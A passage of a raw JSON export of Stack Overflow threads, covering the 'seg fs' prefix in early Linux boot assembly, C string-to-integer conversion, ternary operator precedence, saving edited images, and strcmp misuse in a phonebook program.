"edited": false, "score": 2, "creation_date": 1551871265, "post_id": 55021769, "comment_id": 96797033, "body": "The line above has the comment <code>fs:bx is parameter table address</code>"}], "answers": [{"comments": [{"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1551877064, "post_id": 55021853, "comment_id": 96800391, "body": "See <a href=\"https://stackoverflow.com/questions/14528646/what-does-seg-directive-do-in-8086?rq=1\" title=\"what does seg directive do in 8086\">stackoverflow.com/questions/14528646/&hellip;</a>: <code>SEG A</code> resolves to the segment address where <code>A</code> resides (x86 architecture)."}, {"owner": {"reputation": 29, "user_id": 7700892, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d98bb5d370195c011e599505a0f1b5a1?s=128&d=identicon&r=PG&f=1", "display_name": "chenyiliang", "link": "https://stackoverflow.com/users/7700892/chenyiliang"}, "edited": false, "score": 0, "creation_date": 1551955676, "post_id": 55021853, "comment_id": 96834657, "body": "I still don&#39;t quite understand what the [seg] instruction is trying to accomplish. There is no specific AT&amp;T code to explain!"}], "tags": [], "owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "is_accepted": false, "score": 4, "last_activity_date": 1551871229, "creation_date": 1551871229, "answer_id": 55021853, "question_id": 55021769, "link": "https://stackoverflow.com/questions/55021769/what-is-meant-seg-fs-in-the-linux-kernel-bootsect-s-file/55021853#55021853", "title": "what is meant &quot;seg fs&quot; in the linux kernel bootsect.s file", "body": "<p>I assume it assembles as a <code>fs</code> prefix for the next instruction.  That would match the comments, and is the only thing that makes sense.</p>\n\n<p>Should be easy enough to build it and disassemble (into AT&amp;T syntax if you want).</p>\n\n<p>In AT&amp;T syntax, you can just use <code>fs</code> as a prefix to other mnemonics.</p>\n\n<pre><code>fs movsw\n</code></pre>\n\n<p>assembles to this (in 64-bit mode.  16-bit mode would skip the 66 operand-size prefix).</p>\n\n<pre><code>0000000000000000 &lt;.text&gt;:\n   0:   64 66 a5                movsw  %fs:(%rsi),%es:(%rdi)\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1551992309, "post_id": 55042907, "comment_id": 96855224, "body": "This is obviously wrong.  The original code has a <code>rep movSw</code>, but you have a useless rep prefix on a plain <code>mov</code>.  Also, it&#39;s not an answer; it looks like it should be an edit to the question."}, {"owner": {"reputation": 29, "user_id": 7700892, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d98bb5d370195c011e599505a0f1b5a1?s=128&d=identicon&r=PG&f=1", "display_name": "chenyiliang", "link": "https://stackoverflow.com/users/7700892/chenyiliang"}, "reply_to_user": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1552009845, "post_id": 55042907, "comment_id": 96860389, "body": "is it wrong? ! But I can compile this code and ran through in virtual machine too!, there is something wrong ! ? Then can you write the correct AT&amp;T assembly code for me? !"}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1552019940, "post_id": 55042907, "comment_id": 96862467, "body": "It might possibly work correctly, IDK.  But it&#39;s not an accurate translation of the as86 source."}, {"owner": {"reputation": 29, "user_id": 7700892, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d98bb5d370195c011e599505a0f1b5a1?s=128&d=identicon&r=PG&f=1", "display_name": "chenyiliang", "link": "https://stackoverflow.com/users/7700892/chenyiliang"}, "reply_to_user": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1552021499, "post_id": 55042907, "comment_id": 96862823, "body": "@PeterCordes: I know, but I can only do this because I don&#39;t know what to do is correct. I can only ensure that the functions implemented are the same! !"}], "tags": [], "owner": {"reputation": 29, "user_id": 7700892, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d98bb5d370195c011e599505a0f1b5a1?s=128&d=identicon&r=PG&f=1", "display_name": "chenyiliang", "link": "https://stackoverflow.com/users/7700892/chenyiliang"}, "is_accepted": false, "score": -1, "last_activity_date": 1551958741, "creation_date": 1551958741, "answer_id": 55042907, "question_id": 55021769, "link": "https://stackoverflow.com/questions/55021769/what-is-meant-seg-fs-in-the-linux-kernel-bootsect-s-file/55042907#55042907", "title": "what is meant &quot;seg fs&quot; in the linux kernel bootsect.s file", "body": "<p>who can tell me to change this to be correct or not? !</p>\n\n<pre><code>__go:   \nmovw    %cs         ,   %ax\nmovw    $0x4000-12  ,   %dx\nmovw    %ax         ,   %ds\nmovw    %ax         ,   %es\nmovw    %ax         ,   %ss\nmovw    %dx         ,   %sp\npushw   $0x0000\npopw    %fs\nmovw    $0x0078     ,   %bx\nlgs     %fs:(%bx)   ,   %si\nmovw    %dx         ,   %di\nmovw    $0x0006     ,   %cx\ncld\nrep\nmovw    %dx         ,   %di\nmovw    $0x12       ,   0x0004(%di)\nmovw    %di         ,   %fs:(%bx)\nmovw    %es         ,   %fs:0x0002(%bx)\nmovw    %cs         ,   %ax\nmovw    %ax         ,   %fs\nmovw    %ax         ,   %gs\nxorb    %ah         ,   %ah\nxorb    %dl         ,   %dl\nint     $0x13\n</code></pre>\n"}], "owner": {"reputation": 29, "user_id": 7700892, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d98bb5d370195c011e599505a0f1b5a1?s=128&d=identicon&r=PG&f=1", "display_name": "chenyiliang", "link": "https://stackoverflow.com/users/7700892/chenyiliang"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 147, "favorite_count": 0, "answer_count": 2, "score": 3, "last_activity_date": 1551958741, "creation_date": 1551870911, "last_edit_date": 1551871096, "question_id": 55021769, "link": "https://stackoverflow.com/questions/55021769/what-is-meant-seg-fs-in-the-linux-kernel-bootsect-s-file", "title": "what is meant &quot;seg fs&quot; in the linux kernel bootsect.s file", "body": "<p>When I reading the early Linux kernel code, I encountered a problem in boot/bootsect.s that was difficult to understanding.\"seg fs\" ,What is it doing? If I want to change to AT&amp;T's assembly syntax, How should I do!</p>\n\n<pre><code>    go: mov ax,cs       \n    mov dx,#0x4000-12   ! 0x4000 is arbitrary value &gt;= length of\n                ! bootsect + length of setup + room for stack\n                ! 12 is disk parm size\n\n! bde - changed 0xff00 to 0x4000 to use debugger at 0x6400 up (bde).  We\n! wouldn't have to worry about this if we checked the top of memory.  Also\n! my BIOS can be configured to put the wini drive tables in high memory\n! instead of in the vector table.  The old stack might have clobbered the\n! drive table.\n\n    mov ds,ax\n    mov es,ax\n    mov ss,ax       ! put stack at INITSEG:0x4000-12.\n    mov sp,dx\n/*\n *  Many BIOS's default disk parameter tables will not \n *  recognize multi-sector reads beyond the maximum sector number\n *  specified in the default diskette parameter tables - this may\n *  mean 7 sectors in some cases.\n *\n *  Since single sector reads are slow and out of the question,\n *  we must take care of this by creating new parameter tables\n *  (for the first disk) in RAM.  We will set the maximum sector\n *  count to 18 - the most we will encounter on an HD 1.44.  \n *\n *  High doesn't hurt.  Low does.\n *\n *  Segments are as follows: ds=es=ss=cs - INITSEG,\n *      fs = 0, gs = parameter table segment\n */\n\n    push    #0\n    pop fs\n    mov bx,#0x78        ! fs:bx is parameter table address\n    seg fs\n    lgs si,(bx)         ! gs:si is source\n\n    mov di,dx           ! es:di is destination\n    mov cx,#6           ! copy 12 bytes\n    cld\n\n    rep\n    seg gs\n    movsw\n\n    mov di,dx\n    movb    4(di),*18       ! patch sector count\n\n    seg fs\n    mov (bx),di\n    seg fs\n    mov 2(bx),es\n\n    mov ax,cs\n    mov fs,ax\n    mov gs,ax\n\n    xor ah,ah           ! reset FDC \n    xor dl,dl\n    int     0x13    \n</code></pre>\n"}, {"tags": ["c", "function", "pointers"], "comments": [{"owner": {"reputation": 167, "user_id": 8978833, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/345e2f95224802c86523ce8b18ad35ef?s=128&d=identicon&r=PG&f=1", "display_name": "Anil", "link": "https://stackoverflow.com/users/8978833/anil"}, "edited": false, "score": 0, "creation_date": 1551868412, "post_id": 55020929, "comment_id": 96795324, "body": "This function has to be in a file other than main file?? or u just need to add a funtion?"}, {"owner": {"reputation": 22777, "user_id": 133203, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/Fp3hB.jpg?s=128&g=1", "display_name": "Federico klez Culloca", "link": "https://stackoverflow.com/users/133203/federico-klez-culloca"}, "edited": false, "score": 4, "creation_date": 1551868876, "post_id": 55020929, "comment_id": 96795581, "body": "I&#39;m a bit confused by the signature of your teacher&#39;s function. What are the expected inputs and outputs? I mean, it seems rather clear that they expect you to put the input in <code>inputString</code> and the output in <code>integerPtr</code>, but why should the function return a <code>char *</code> instead of just returning an <code>int</code> and ditching <code>integerPtr</code>?"}, {"owner": {"reputation": 31, "user_id": 11158798, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9eea3ede50ccee235f8cddfa80cd852f?s=128&d=identicon&r=PG&f=1", "display_name": "littlemimus", "link": "https://stackoverflow.com/users/11158798/littlemimus"}, "edited": false, "score": 0, "creation_date": 1551868938, "post_id": 55020929, "comment_id": 96795625, "body": "the function does need to be in another file other than main. im at a loss also with the pointer expected outputs.  unfortunately i cant use strtol()) as that is a function and i can only use the function prototype defined by my professor"}, {"owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "reply_to_user": {"reputation": 22777, "user_id": 133203, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/Fp3hB.jpg?s=128&g=1", "display_name": "Federico klez Culloca", "link": "https://stackoverflow.com/users/133203/federico-klez-culloca"}, "edited": false, "score": 2, "creation_date": 1551868943, "post_id": 55020929, "comment_id": 96795627, "body": "@FedericoklezCulloca I would expect it to return a pointer to the first non-converted character, that is quite common in various ways (basically this is a mixup of <code>strtol()</code>) and useful."}, {"owner": {"reputation": 22777, "user_id": 133203, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/Fp3hB.jpg?s=128&g=1", "display_name": "Federico klez Culloca", "link": "https://stackoverflow.com/users/133203/federico-klez-culloca"}, "edited": false, "score": 1, "creation_date": 1551869315, "post_id": 55020929, "comment_id": 96795871, "body": "Please, don&#39;t post code as images. Code is text, please post it as such."}], "answers": [{"comments": [{"owner": {"reputation": 22777, "user_id": 133203, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/Fp3hB.jpg?s=128&g=1", "display_name": "Federico klez Culloca", "link": "https://stackoverflow.com/users/133203/federico-klez-culloca"}, "edited": false, "score": 3, "creation_date": 1551868988, "post_id": 55021119, "comment_id": 96795652, "body": "While this code snippet may solve the question, <a href=\"http://meta.stackexchange.com/questions/114762/explaining-entirely-code-based-answers\">including an explanation</a> really helps to improve the quality of your post. Remember that you are answering the question for readers in the future, and those people might not know the reasons for your code suggestion."}], "tags": [], "owner": {"reputation": 35, "user_id": 10673575, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7c61d542de52e4638e7a263abb04ac9f?s=128&d=identicon&r=PG&f=1", "display_name": "Y.Jie", "link": "https://stackoverflow.com/users/10673575/y-jie"}, "is_accepted": false, "score": 1, "last_activity_date": 1551869146, "last_edit_date": 1551869146, "creation_date": 1551868945, "answer_id": 55021119, "question_id": 55020929, "link": "https://stackoverflow.com/questions/55020929/ascii-to-integer-using-no-library-functions/55021119#55021119", "title": "Ascii to integer using no library functions", "body": "<pre><code>    #include &lt;stdio.h&gt;\n    #include &lt;stddef.h&gt;  \n\n    char * asciiToInteger(char *inputString, int *integerPtr){\n           int convertedResult =0;\n\n           for(int i = 0; inputString[i] != '\\0'; i++){\n            convertedResult = convertedResult*10 + inputString[i] - '0';\n\n          }\n          *integerPtr=convertedResult;\n\n\n         return inputString;\n         }\n\n int main() {  \n    char testString[] = \"123\";\n    int  integerPtr;\n    asciiToInteger(testString, &amp;integerPtr) ;\n    printf(\"%d\\n\",integerPtr);\n\n    return 0;\n    }\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "is_accepted": false, "score": 1, "last_activity_date": 1551869222, "creation_date": 1551869222, "answer_id": 55021203, "question_id": 55020929, "link": "https://stackoverflow.com/questions/55020929/ascii-to-integer-using-no-library-functions/55021203#55021203", "title": "Ascii to integer using no library functions", "body": "<p>Your code has a couple of problems:</p>\n\n<ul>\n<li>It assumes the entire string is digits</li>\n<li>It checks for the end of string twice</li>\n</ul>\n\n<p>I think a better implementation would be:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nconst char *asciiToInteger(const char *inputString, int *value)\n{\n  int result = 0;\n  while (isdigit((unsigned int) *inputString))\n  {\n    result *= 10;\n    result += *inputString++ - '0';\n  }\n  *value = result;\n  return inputString;\n}\n</code></pre>\n\n<p>This returns a pointer to the first non-converted character, which might be to the end of string marker if the string is all digits. I added <code>const</code> on the strings of course, since this converter is just reading from the strings.</p>\n"}, {"tags": [], "owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "is_accepted": false, "score": 1, "last_activity_date": 1551874739, "last_edit_date": 1551874739, "creation_date": 1551870398, "answer_id": 55021616, "question_id": 55020929, "link": "https://stackoverflow.com/questions/55020929/ascii-to-integer-using-no-library-functions/55021616#55021616", "title": "Ascii to integer using no library functions", "body": "<p>When you get an assignment like this the first step is to make sure you understand what the function is supposed to do. Your question has no such description so that is the place to start.</p>\n\n<p>From the behavior of the <code>main</code> function it seems to be something like:</p>\n\n<ol>\n<li><p>If the first character in the input string is <strong>not</strong> a digit return NULL</p></li>\n<li><p>If the first character in the input string <strong>is</strong> a digit convert all leading digits to an integer stored in the object pointed to by <code>integerPtr</code> and return a pointer to the character following the converted digits.</p></li>\n</ol>\n\n<p>Examples:</p>\n\n<pre><code>inputString = \"a123b67\" --&gt; return NULL\n\ninputString = \"123b67\"  --&gt; *integerPtr = 123 and return a pointer to the 'b' in the input\n</code></pre>\n\n<p>That could look something like this:</p>\n\n<pre><code>char *asciiToInteger(char *inputString, int *integerPtr) {\n    if (*inputString &lt; '0' || *inputString &gt; '9') \n        return NULL;  // no leading digit\n\n    *integerPtr = 0;\n    do\n    {\n        *integerPtr = *integerPtr * 10 + *inputString - '0';\n        ++inputString;\n    } while (*inputString &gt;= '0' &amp;&amp; *inputString &lt;= '9');\n    return inputString;\n}\n</code></pre>\n\n<p>Notice that the code above can't handle negative integers.</p>\n"}], "owner": {"reputation": 31, "user_id": 11158798, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9eea3ede50ccee235f8cddfa80cd852f?s=128&d=identicon&r=PG&f=1", "display_name": "littlemimus", "link": "https://stackoverflow.com/users/11158798/littlemimus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 234, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1551874739, "creation_date": 1551868303, "last_edit_date": 1551869295, "question_id": 55020929, "link": "https://stackoverflow.com/questions/55020929/ascii-to-integer-using-no-library-functions", "title": "Ascii to integer using no library functions", "body": "<p>My teacher gave us an assignment where we create a function that reads ASCII digit characters and converts them to a number without using any library functions such as <code>atoi</code>. Through some research i came up with this in my own file:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;sttdef.h&gt;\n\nint main() {\n\n    char testString[] = \"123\";\n    int convertedResult = 0;\n    int i;\n\n    for(i = 0; testString[i] != '\\0'; i++){\n        convertedResult = convertedResult*10 + testString[i] - '0';\n        printf(\"%i\\n\",convertedResult);\n        if (testString[i] == '\\0') {\n            break;\n        }\n    }\n    return 0;\n}\n</code></pre>\n\n<p>While this works on its own i have to use the main file he gave us to call on this specific function. </p>\n\n<pre><code> char *asciiToInteger(char *inputString, int *integerPtr) {\n     return inputString;\n }\n</code></pre>\n\n<p>I'm a bit confused as to how to proceed from here? attatched picture is main </p>\n\n<p><a href=\"https://i.stack.imgur.com/AVzdQ.jpg\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/AVzdQ.jpg\" alt=\"enter image description here\"></a></p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 5, "creation_date": 1551867266, "post_id": 55020533, "comment_id": 96794548, "body": "There is really no good reason to cram that loop into one line like that. What&#39;s worse, it makes actually figuring out the problem <i>harder</i> for you."}], "answers": [{"tags": [], "owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "is_accepted": true, "score": 4, "last_activity_date": 1551867757, "creation_date": 1551867757, "answer_id": 55020744, "question_id": 55020533, "link": "https://stackoverflow.com/questions/55020533/c-errorlvalue-required-as-left-operand-of-assignment/55020744#55020744", "title": "C error:lvalue required as left operand of assignment", "body": "<p>Despite shoving all the logic into one line, the problem is actually in one expression (pardon me for adding spaces):</p>\n\n<pre><code>(n%2) ? n=3*n+1 : n/=2\n</code></pre>\n\n<p>The <a href=\"https://en.cppreference.com/w/c/language/operator_precedence\" rel=\"nofollow noreferrer\">precedence rules for C expressions</a> are like that. Assignment (and that includes compound assignment) binds less tightly than <code>?:</code>. So the compiler has to interpret what you wrote as:</p>\n\n<pre><code>((n%2) ? n=3*n+1 : n) /=2\n</code></pre>\n\n<p>Since <code>?:</code> doesn't produce an lvalue (something that can appear on the left of an assignment), you get an error. Your use of parentheses forces the precedence to match what you wanted.</p>\n\n<p>But an even better way to write that is to not be \"clever\" and think there is some \"elegance\" in using as much tokens as possible in a single expression. Here's another version, which is far more readable, and easier to verify as correct:</p>\n\n<pre><code>if (n%2) {\n    n = 3*n+1;\n} else {\n    n /= 2;\n}\n</code></pre>\n\n<p>And it's no less efficient than using a conditional expression.</p>\n"}, {"tags": [], "owner": {"reputation": 4678, "user_id": 3186922, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/bdiCk.jpg?s=128&g=1", "display_name": "Hari Krishnan", "link": "https://stackoverflow.com/users/3186922/hari-krishnan"}, "is_accepted": false, "score": 0, "last_activity_date": 1551868551, "creation_date": 1551868551, "answer_id": 55020993, "question_id": 55020533, "link": "https://stackoverflow.com/questions/55020533/c-errorlvalue-required-as-left-operand-of-assignment/55020993#55020993", "title": "C error:lvalue required as left operand of assignment", "body": "<p>Here the compiler takes l value as</p>\n\n<pre><code>((n%2) ? n=3*n+1 : n) /\n</code></pre>\n\n<p>and r value as</p>\n\n<pre><code>2\n</code></pre>\n\n<p>Since <code>((n%2) ? n=3*n+1 : n) /</code> = <code>2</code> is an invalid statement and l value is not a variable, compiler throws error. You can provide the precedence of execution to the compiler by adding brackets.</p>\n"}], "owner": {"reputation": 3, "user_id": 11158928, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/00ddcdab501ff52a0a003619321205a6?s=128&d=identicon&r=PG&f=1", "display_name": "fine", "link": "https://stackoverflow.com/users/11158928/fine"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 71, "favorite_count": 0, "accepted_answer_id": 55020744, "answer_count": 2, "score": -2, "last_activity_date": 1551868551, "creation_date": 1551867165, "last_edit_date": 1551867352, "question_id": 55020533, "link": "https://stackoverflow.com/questions/55020533/c-errorlvalue-required-as-left-operand-of-assignment", "title": "C error:lvalue required as left operand of assignment", "body": "<pre><code>#include&lt;stdio.h&gt;\nint hailstone(int n){ \n        int length=1;\n        while(1&lt;n){(n%2)?n=3*n+1:n/=2;length++;}//error\n        //while(1&lt;n){(n%2)?n=3*n+1:(n/=2);length++;} right\n        return length;\n}\nint main()\n{\n        int n;\n        scanf(\"%d\",&amp;n);\n        printf(\"%d\\n\",hailstone(n));\n}\n</code></pre>\n\n<p>There is an error in line four\uff0cthe gcc compiler said <strong>lvalue required as left operand of assignment</strong>,but if i add brackets it will be right.like line five,and i don not know why.</p>\n"}, {"tags": ["c#", "c++", "c"], "comments": [{"owner": {"reputation": 1246, "user_id": 6556709, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6389fba1f75367a547c52d9779902b20?s=128&d=identicon&r=PG&f=1", "display_name": "user6556709", "link": "https://stackoverflow.com/users/6556709/user6556709"}, "edited": false, "score": 1, "creation_date": 1551864684, "post_id": 55019665, "comment_id": 96792949, "body": "What GUI toolkit, what OS? Please show some code."}, {"owner": {"reputation": 99, "user_id": 4873908, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a6243cc32e3cd8d05169dcd0b3d0a33f?s=128&d=identicon&r=PG&f=1", "display_name": "svenQ", "link": "https://stackoverflow.com/users/4873908/svenq"}, "edited": false, "score": 1, "creation_date": 1551864849, "post_id": 55019665, "comment_id": 96793054, "body": "Also explain why this has somthing to do with UX/UI. While when you save the edited Picture and overwriting the old one It sounds more like just a coding Problem. Do you also want to show the 2 pictures after them being edited or what is the wanted end result?"}, {"owner": {"reputation": 972, "user_id": 6187682, "user_type": "registered", "accept_rate": 52, "profile_image": "https://lh5.googleusercontent.com/-S5RpRvzUcMQ/AAAAAAAAAAI/AAAAAAAAQKs/IMT5rsd-mbs/photo.jpg?sz=128", "display_name": "Jessica Chambers", "link": "https://stackoverflow.com/users/6187682/jessica-chambers"}, "edited": false, "score": 1, "creation_date": 1551865597, "post_id": 55019665, "comment_id": 96793482, "body": "Can you change the filename that the file writes to by default? eg: <code>my_picture.png</code> is the original, and once you have edited it you save it to <code>my_picture_1.png</code>"}], "owner": {"reputation": 1, "user_id": 11158711, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb6a30b241299b896f5edc35ef9f4c82?s=128&d=identicon&r=PG&f=1", "display_name": "Prashant Kundnani", "link": "https://stackoverflow.com/users/11158711/prashant-kundnani"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 51, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1551864579, "creation_date": 1551864579, "question_id": 55019665, "link": "https://stackoverflow.com/questions/55019665/ux-ui-design-for-saving-an-edited-picture-automatically-without-overwriting-prev", "title": "UX/UI design for saving an edited picture automatically without overwriting previous one", "body": "<p>I am trying to save a picture/images after making changes on it, but it is overwriting the old one. Is there a way i can design my UI so the edited picture can be saved separately.</p>\n\n<p>Any feedback is greatly appreciated. </p>\n"}, {"tags": ["c", "pointers", "strcmp"], "comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 5, "creation_date": 1551861226, "post_id": 55018643, "comment_id": 96790959, "body": "Long question for a simple syntax error. Change <code>strcmp((char)p-&gt;name, &quot;#&quot;)</code> to <code>strcmp(p-&gt;name, &quot;#&quot;)</code>. A single <code>char</code> is not a string, hence the warning."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 4, "creation_date": 1551861229, "post_id": 55018643, "comment_id": 96790963, "body": "<b><i>Never ever</i></b> use <code>gets</code>! It&#39;s <a href=\"https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used\">a dangerous function</a> that even have been removed form the C standard. Use e.g. <a href=\"https://en.cppreference.com/w/c/io/fgets\" rel=\"nofollow noreferrer\"><code>fgets</code></a> instead, but be aware of its differences from <code>gets</code>."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1551861339, "post_id": 55018643, "comment_id": 96791031, "body": "Actually, the problem here seems to be that you expect a single <code>char</code> to be the string class of C. There <i>is</i> no string class in C. Everything is raw, manual arrays, <code>char[]</code>. So your question is actually &quot;how to do string handling in C&quot;, which is too big a topic to answer here. The answer is to read the chapter about strings in your C book."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1551861354, "post_id": 55018643, "comment_id": 96791037, "body": "As for the rest of your program, if the compiler doesn&#39;t shout warnings at you already, then enable more warnings and treat them as errors. For example, what do you <i>really</i> return from the <code>readin</code> function?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1551861487, "post_id": 55018643, "comment_id": 96791116, "body": "And your <code>search</code> function only seems to do some string comparison (in a very complicated way). You don&#39;t actually search through the <i>array</i> of <code>PhoneBk</code> elements to find the corresponding element."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1551861601, "post_id": 55018643, "comment_id": 96791177, "body": "Lastly, and to summarize things: It seems like you&#39;re guessing about plenty of things without much knowledge. Perhaps you should consider taking a few steps back, get a couple of beginners books to read, and start over from the beginning."}, {"owner": {"reputation": 6679, "user_id": 10622916, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21bd4eeaa5ba60dc021c5ccfbf4a963d?s=128&d=identicon&r=PG&f=1", "display_name": "Bodo", "link": "https://stackoverflow.com/users/10622916/bodo"}, "edited": false, "score": 0, "creation_date": 1551865510, "post_id": 55018643, "comment_id": 96793427, "body": "In <code>readin</code> the check for input <code>&quot;#&quot;</code> in the loop is wrong. When the loop condition is checked for the first time you will have initialized the first element&#39;s structure field as <code>&quot;Test&quot;</code>, but the next time it will check the next array element after the one you just entered."}, {"owner": {"reputation": 55, "user_id": 11158412, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-RwnCUrojbX8/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdZUyWIEQQCUlyX3bNXyLArhBAGlw/mo/photo.jpg?sz=128", "display_name": "ProximanovaMetropolis", "link": "https://stackoverflow.com/users/11158412/proximanovametropolis"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1551865931, "post_id": 55018643, "comment_id": 96793681, "body": "As pointed out by @Someprogrammerdude, it is clear that I don&#39;t know anything about how an array of structures is passed as a single pointer element. My point is that the pointer to the array of structures should be incremented every time, but I really don&#39;t know how to write the code for that (yes, I am that inexperienced). How, indeed, do you traverse an array of structures in a function when it&#39;s only been passed as a single pointer?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1551866201, "post_id": 55018643, 